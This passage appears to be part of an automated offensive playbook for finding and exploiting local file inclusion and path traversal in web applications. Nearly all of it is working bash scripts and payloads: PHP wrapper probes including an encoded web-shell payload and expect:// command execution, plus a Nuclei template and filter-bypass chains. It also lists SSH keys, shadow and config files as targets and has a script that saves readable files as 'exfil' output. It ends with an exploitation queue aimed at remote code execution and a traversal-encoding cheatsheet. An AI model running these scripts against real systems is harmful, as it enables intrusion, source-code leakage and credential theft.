‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
# PHP has path length limits (4096 bytes)
# Exceeding causes truncation

# Generate long path
long_path=""
for i in $(seq 1 2048); do
    long_path="${long_path}/."
done

test_url="${base_url}?${param}=../../../etc/passwd${long_path}"

================================================================================
PHASE 5: PHP WRAPPER DETECTION
================================================================================

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
5.1 Test Common PHP Wrappers
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/bin/bash
# test_php_wrappers.sh

PHP_WRAPPERS=(
    # php://filter - Read source code (base64 encoded)
    "php://filter/convert.base64-encode/resource=index"
    "php://filter/convert.base64-encode/resource=index.php"
    "php://filter/read=convert.base64-encode/resource=config"
    "php://filter/read=string.rot13/resource=index.php"
    
    # php://input - POST data as file content (requires allow_url_include)
    "php://input"
    
    # data:// - Inline data (requires allow_url_include)
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
    "data://text/plain,<?php phpinfo();?>"
    
    # expect:// - Execute command (rarely enabled)
    "expect://id"
    "expect://whoami"
    
    # zip:// - Read from zip archive
    # phar:// - PHP archive
    
    # file:// - Local file (basic)
    "file:///etc/passwd"
)

test_wrappers() {
    local url="$1"
    local param="$2"
    local base_url="${url%%\?*}"
    
    for wrapper in "${PHP_WRAPPERS[@]}"; do
        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$wrapper', safe=''))")
        test_url="${base_url}?${param}=${encoded}"
        
        response=$(curl -sk --max-time 10 "$test_url" 2>/dev/null)
        
        # Check for base64 encoded PHP (php://filter success)
        if echo "$response" | grep -qE '^[A-Za-z0-9+/]{50,}={0,2}$'; then
            echo "[+] PHP FILTER WORKS: $test_url"
            echo "$url|$param|php://filter" >> outputs/lfi/wrapper_support.txt
            
            # Try to decode
            decoded=$(echo "$response" | base64 -d 2>/dev/null)
            if echo "$decoded" | grep -qiE '<\?php|<\?='; then
                echo "[+] SOURCE CODE LEAKED!"
                echo "$decoded" >> outputs/lfi/leaked_source_${param}.txt
            fi
        fi
        
        # Check for phpinfo (data:// success)
        if echo "$response" | grep -qiE 'phpinfo|PHP Version|php\.ini'; then
            echo "[+] DATA WRAPPER WORKS: $test_url"
            echo "$url|$param|data://" >> outputs/lfi/wrapper_support.txt
        fi
        
        # Check for command output (expect:// success)
        if echo "$response" | grep -qE 'uid=[0-9]+|gid=[0-9]+|www-data'; then
            echo "[+] EXPECT WRAPPER RCE: $test_url"
            echo "$url|$param|expect://|CRITICAL" >> outputs/lfi/wrapper_support.txt
        fi
    done
}

# Process candidates
while IFS='|' read -r url param value; do
    test_wrappers "$url" "$param"
done < outputs/lfi/file_params_candidates.txt

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
5.2 php://filter Variations
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
# Different filter chains for bypassing
FILTER_CHAINS=(
    # Basic
    "php://filter/convert.base64-encode/resource="
    
    # Chain filters
    "php://filter/read=convert.base64-encode/resource="
    "php://filter/convert.base64-encode|convert.base64-decode/resource="
    
    # Bypass filters
    "php://filter/convert.iconv.UTF-8.UTF-7/resource="
    "php://filter/zlib.deflate/convert.base64-encode/resource="
    
    # Read specific sections
    "php://filter/read=string.strip_tags/resource="
    "php://filter/read=string.toupper/resource="
)

# Test each filter on discovered file params
for filter in "${FILTER_CHAINS[@]}"; do
    test_url="${base_url}?${param}=${filter}index.php"
    curl -sk "$test_url"
done

================================================================================
PHASE 6: NUCLEI LFI TEMPLATES
================================================================================

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
6.1 Run Nuclei LFI Templates
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
# LFI-specific templates
nuclei -l outputs/lfi/file_params_candidates.txt \
    -t fuzzing/lfi*.yaml \
    -t vulnerabilities/generic/generic-lfi*.yaml \
    -t vulnerabilities/other/lfi-*.yaml \
    -severity critical,high,medium \
    -c 50 -rl 100 \
    -timeout 10 \
    -json -o outputs/lfi/nuclei_lfi_results.json

# Parse results
jq -r 'select(.info.severity == "critical" or .info.severity == "high") | 
       "\(.host)|\(.matched-at)|\(.info.name)"' \
    outputs/lfi/nuclei_lfi_results.json >> outputs/lfi/lfi_confirmed.txt

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
6.2 Custom Nuclei Template
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
cat > temp/agent1/custom-lfi.yaml << 'EOF'
id: custom-lfi-check

info:
  name: Custom LFI Detection
  author: agent1
  severity: high
  tags: lfi,traversal

http:
  - method: GET
    path:
      - "{{BaseURL}}{{path}}?{{param}}=../../../etc/passwd"
      - "{{BaseURL}}{{path}}?{{param}}=....//....//....//etc/passwd"
      - "{{BaseURL}}{{path}}?{{param}}=..%2f..%2f..%2fetc%2fpasswd"
      - "{{BaseURL}}{{path}}?{{param}}=php://filter/convert.base64-encode/resource=index"

    matchers-condition: or
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0:"
          - "daemon:[x*]:[0-9]+:"
          - "www-data:[x*]:[0-9]+:"
        condition: or

      - type: word
        words:
          - "[fonts]"
          - "[extensions]"
          - "[mci extensions]"
        condition: or

      - type: regex
        name: base64-source
        regex:
          - "^[A-Za-z0-9+/]{100,}={0,2}$"
EOF

================================================================================
PHASE 7: INTERESTING FILES TO READ
================================================================================

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
7.1 Linux Target Files
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
LINUX_FILES=(
    "/etc/passwd"
    "/etc/shadow"                    # Usually not readable
    "/etc/hosts"
    "/etc/hostname"
    "/etc/issue"
    "/etc/os-release"
    "/proc/self/environ"             # Environment variables!
    "/proc/self/cmdline"
    "/proc/self/fd/0"
    "/proc/self/status"
    "/proc/version"
    "/proc/net/tcp"
    "/proc/net/route"
    
    # Web server configs
    "/etc/apache2/apache2.conf"
    "/etc/apache2/sites-enabled/000-default.conf"
    "/etc/nginx/nginx.conf"
    "/etc/nginx/sites-enabled/default"
    "/var/log/apache2/access.log"
    "/var/log/apache2/error.log"
    "/var/log/nginx/access.log"
    "/var/log/nginx/error.log"
    
    # Application files
    "/var/www/html/index.php"
    "/var/www/html/config.php"
    "/var/www/html/.htaccess"
    "/var/www/html/wp-config.php"
    
    # SSH
    "/root/.ssh/id_rsa"
    "/root/.ssh/authorized_keys"
    "/home/*/.ssh/id_rsa"
    
    # Cron
    "/etc/crontab"
    "/var/spool/cron/crontabs/root"
)

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
7.2 Windows Target Files
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
WINDOWS_FILES=(
    "C:\\Windows\\win.ini"
    "C:\\Windows\\system.ini"
    "C:\\Windows\\System32\\drivers\\etc\\hosts"
    "C:\\Windows\\debug\\NetSetup.log"
    "C:\\Windows\\iis.log"
    "C:\\inetpub\\wwwroot\\web.config"
    "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\*"
    "C:\\xampp\\apache\\conf\\httpd.conf"
    "C:\\xampp\\php\\php.ini"
    "C:\\xampp\\htdocs\\config.php"
)

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
7.3 Automated File Enumeration
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/bin/bash
# enumerate_files.sh

# For each confirmed LFI, enumerate interesting files
while IFS='|' read -r url param payload os; do
    echo "[*] Enumerating files via: $url"
    
    base_url="${url%%\?*}"
    
    if [ "$os" == "unix" ] || [ "$os" == "linux" ]; then
        files=("${LINUX_FILES[@]}")
    else
        files=("${WINDOWS_FILES[@]}")
    fi
    
    for file in "${files[@]}"; do
        # Build traversal path
        traversal_payload=$(echo "$payload" | sed "s|etc/passwd|${file#/}|")
        test_url="${base_url}?${param}=${traversal_payload}"
        
        response=$(curl -sk --max-time 5 "$test_url" 2>/dev/null)
        size=${#response}
        
        # Check if we got meaningful content
        if [ $size -gt 50 ]; then
            # Verify it's not an error page
            if ! echo "$response" | grep -qiE "not found|error|denied|forbidden"; then
                echo "[+] READABLE: $file ($size bytes)"
                echo "$url|$file|$size" >> outputs/lfi/readable_files.txt
                
                # Save content
                safe_filename=$(echo "$file" | tr '/' '_' | tr '\\' '_')
                echo "$response" > "outputs/lfi/exfil_${safe_filename}.txt"
            fi
        fi
    done
    
done < outputs/lfi/traversal_confirmed.txt

================================================================================
PHASE 8: BUILD EXPLOITATION QUEUE
================================================================================

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
8.1 Prioritize for Task 73
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/bin/bash
# build_exploitation_queue.sh

# Priority order:
# 1. PHP wrapper support (can lead to RCE)
# 2. Log files readable (log poisoning ‚Üí RCE)
# 3. /proc/self/environ readable (env injection ‚Üí RCE)
# 4. Other confirmed LFI

echo "# LFI Exploitation Queue for Task 73" > outputs/queue_lfi_exploitation.txt
echo "# Format: url|param|technique|priority" >> outputs/queue_lfi_exploitation.txt
echo "" >> outputs/queue_lfi_exploitation.txt

# Add wrapper-supported (highest priority)
if [ -f outputs/lfi/wrapper_support.txt ]; then
    echo "## PHP Wrapper Support (Priority: CRITICAL)" >> outputs/queue_lfi_exploitation.txt
    cat outputs/lfi/wrapper_support.txt >> outputs/queue_lfi_exploitation.txt
fi

# Check for log file access
if grep -q "access.log\|error.log" outputs/lfi/readable_files.txt 2>/dev/null; then
    echo "" >> outputs/queue_lfi_exploitation.txt
    echo "## Log Files Readable (Priority: HIGH - Log Poisoning)" >> outputs/queue_lfi_exploitation.txt
    grep "access.log\|error.log" outputs/lfi/readable_files.txt >> outputs/queue_lfi_exploitation.txt
fi

# Check for /proc/self/environ
if grep -q "proc/self/environ" outputs/lfi/readable_files.txt 2>/dev/null; then
    echo "" >> outputs/queue_lfi_exploitation.txt
    echo "## /proc/self/environ Readable (Priority: HIGH - Env Injection)" >> outputs/queue_lfi_exploitation.txt
    grep "proc/self/environ" outputs/lfi/readable_files.txt >> outputs/queue_lfi_exploitation.txt
fi

# Add remaining confirmed LFI
echo "" >> outputs/queue_lfi_exploitation.txt
echo "## Other Confirmed LFI" >> outputs/queue_lfi_exploitation.txt
cat outputs/lfi/traversal_confirmed.txt >> outputs/queue_lfi_exploitation.txt

echo "[*] Built exploitation queue: $(wc -l < outputs/queue_lfi_exploitation.txt) entries"

================================================================================
SUMMARY & STATISTICS
================================================================================

echo ""
echo "=========================================="
echo "TASK 72 SUMMARY - LFI/Path Traversal Detection"
echo "=========================================="
echo "File param candidates: $(wc -l < outputs/lfi/file_params_candidates.txt 2>/dev/null || echo 0)"
echo "Traversal confirmed:   $(wc -l < outputs/lfi/traversal_confirmed.txt 2>/dev/null || echo 0)"
echo "LFI confirmed:         $(wc -l < outputs/lfi/lfi_confirmed.txt 2>/dev/null || echo 0)"
echo "PHP wrappers working:  $(wc -l < outputs/lfi/wrapper_support.txt 2>/dev/null || echo 0)"
echo "Files readable:        $(wc -l < outputs/lfi/readable_files.txt 2>/dev/null || echo 0)"
echo ""
echo "Exploitation queue:    outputs/queue_lfi_exploitation.txt"
echo ""
echo "Next: Task 73 - LFI Exploitation & RCE Chains"

================================================================================
‚ö†Ô∏è COMMON MISTAKES TO AVOID ‚ö†Ô∏è
================================================================================

‚ùå Only testing ../../../etc/passwd
   ‚Üí Test MANY encoding variants

‚ùå Forgetting null byte bypass
   ‚Üí Try %00 for older PHP

‚ùå Not checking PHP wrapper support
   ‚Üí php://filter can leak source code!

‚ùå Missing Windows targets
   ‚Üí Always test win.ini on IIS

‚ùå Ignoring depth limits
   ‚Üí Try deeper traversal (10+ levels)

‚ùå Not testing with/without extension
   ‚Üí file.php vs file vs file%00

================================================================================
üìö REFERENCE: TRAVERSAL ENCODING CHEATSHEET
================================================================================

Basic:           ../
URL encoded:     %2e%2e%2f or ..%2f
Double encoded:  %252e%252e%252f
UTF-8:           %c0%ae%c0%ae%c0%af
Overlong UTF-8:  %c0%2e%c0%2e%c0%af
Mixed:           ..%c0%af or %2e%2e/

Backslash (Win): ..\\ or ..%5c or ..%255c

Bypass tricks:
- ....// (filter removes ../ once)
- ..;/ (path normalization)
- ..././ (double traversal)
